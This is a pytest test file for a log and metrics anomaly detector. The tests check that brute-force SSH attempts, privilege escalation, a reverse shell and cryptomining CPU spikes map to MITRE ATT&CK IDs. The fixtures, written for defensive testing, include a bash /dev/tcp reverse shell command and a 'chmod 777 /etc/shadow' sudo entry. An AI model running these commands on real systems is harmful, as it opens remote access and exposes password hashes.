import pytest
import pytest_asyncio
from datetime import datetime, timezone
from app.services.ai_engine import AIEngine
from app.services.network_service import NetworkManager

class MockCollection:
    def __init__(self):
        self.docs = []

    async def insert_one(self, doc):
        if "_id" not in doc:
            import uuid
            doc["_id"] = str(uuid.uuid4())
        self.docs.append(doc)
        return doc

    async def insert_many(self, docs):
        import uuid
        for d in docs:
            if "_id" not in d:
                d["_id"] = str(uuid.uuid4())
        self.docs.extend(docs)
        return docs

    async def find_one(self, query):
        for d in self.docs:
            match = True
            for k, v in query.items():
                if d.get(k) != v:
                    match = False
                    break
            if match:
                return d
        return None

    async def update_one(self, query, update, upsert=False):
        d = await self.find_one(query)
        if d and "$set" in update:
            d.update(update["$set"])
        return d

    async def count_documents(self, query=None):
        if not query:
            return len(self.docs)
        count = 0
        for d in self.docs:
            match = True
            for k, v in query.items():
                if d.get(k) != v:
                    match = False
                    break
            if match:
                count += 1
        return count

class MockDB:
    def __init__(self):
        self.anomalies = MockCollection()
        self.devices = MockCollection()
        self.logs = MockCollection()
        self.connection_history = MockCollection()
        self.enrollment_tokens = MockCollection()

@pytest.mark.asyncio
async def test_ai_brute_force_detection():
    db = MockDB()
    device_id = "test-host-01"
    hostname = "UBUNTU-SERVER"
    
    # 4 consecutive failed password logs
    failed_logs = [
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "device_id": device_id,
            "source": "sshd",
            "event_id": "sshd",
            "message": f"Failed password for invalid user root from 198.51.100.{10+i} port 54321 ssh2"
        }
        for i in range(4)
    ]
    
    anomalies = await AIEngine.analyze_logs(db, device_id, hostname, failed_logs)
    
    # Should detect MITRE T1110 Brute Force
    assert len(anomalies) >= 1
    detected = anomalies[0]
    assert detected["mitre_id"] == "T1110"
    assert detected["severity"] in ["high", "critical"]
    assert any("198.51.100." in e for e in detected["evidence"])
    assert detected["status"] == "active"

@pytest.mark.asyncio
async def test_ai_privilege_escalation_detection():
    db = MockDB()
    device_id = "test-host-02"
    hostname = "DEBIAN-NODE"
    
    priv_logs = [
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "device_id": device_id,
            "source": "sudo",
            "event_id": "sudo",
            "message": "attacker : TTY=pts/1 ; COMMAND=/bin/chmod 777 /etc/shadow"
        }
    ]
    
    anomalies = await AIEngine.analyze_logs(db, device_id, hostname, priv_logs)
    assert len(anomalies) == 1
    assert anomalies[0]["mitre_id"] == "T1548"
    assert anomalies[0]["severity"] == "critical"

@pytest.mark.asyncio
async def test_ai_reverse_shell_detection():
    db = MockDB()
    device_id = "test-host-03"
    hostname = "WORKSTATION-01"
    
    shell_logs = [
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "device_id": device_id,
            "source": "bash",
            "event_id": "exec",
            "message": "bash -i >& /dev/tcp/203.0.113.50/8080 0>&1"
        }
    ]
    
    anomalies = await AIEngine.analyze_logs(db, device_id, hostname, shell_logs)
    assert len(anomalies) == 1
    assert anomalies[0]["mitre_id"] == "T1059"
    assert anomalies[0]["severity"] == "critical"

@pytest.mark.asyncio
async def test_ai_cryptominer_metric_spike():
    db = MockDB()
    device_id = "miner-host"
    hostname = "MINER-PC"
    
    # 15 normal readings then sustained 95% CPU
    for _ in range(15):
        await AIEngine.analyze_metrics(db, device_id, hostname, [{"cpu_percent": 15.0, "network_tx_bytes": 1000}])
        
    spike_metrics = [{"cpu_percent": 96.0, "network_tx_bytes": 2000}]
    for _ in range(5):
        anomalies = await AIEngine.analyze_metrics(db, device_id, hostname, spike_metrics)
        
    assert len(anomalies) >= 1
    assert anomalies[0]["mitre_id"] == "T1496"
    assert anomalies[0]["severity"] == "high"

@pytest.mark.asyncio
async def test_network_connection_history_tracking():
    db = MockDB()
    
    # Device connects
    await NetworkManager.record_connection_event(
        db,
        device_id="dev-abc",
        hostname="PC-ACCOUNTING",
        ip="192.168.1.55",
        mac="11:22:33:44:55:66",
        os_name="windows",
        event_type="connected"
    )
    
    assert len(db.connection_history.docs) == 1
    sess = db.connection_history.docs[0]
    assert sess["hostname"] == "PC-ACCOUNTING"
    assert sess["status"] == "active"
    assert sess["ip_address"] == "192.168.1.55"
    
    # Device switches network (new IP)
    await NetworkManager.record_connection_event(
        db,
        device_id="dev-abc",
        hostname="PC-ACCOUNTING",
        ip="10.0.0.99",
        mac="11:22:33:44:55:66",
        os_name="windows",
        event_type="connected"
    )
    
    # Old session should be marked closed with termination_reason='network_switch'
    closed_sess = db.connection_history.docs[0]
    assert closed_sess["status"] == "closed"
    assert closed_sess["termination_reason"] == "network_switch"
    
    # New active session should exist
    assert len(db.connection_history.docs) == 2
    new_sess = db.connection_history.docs[1]
    assert new_sess["status"] == "active"
    assert new_sess["ip_address"] == "10.0.0.99"
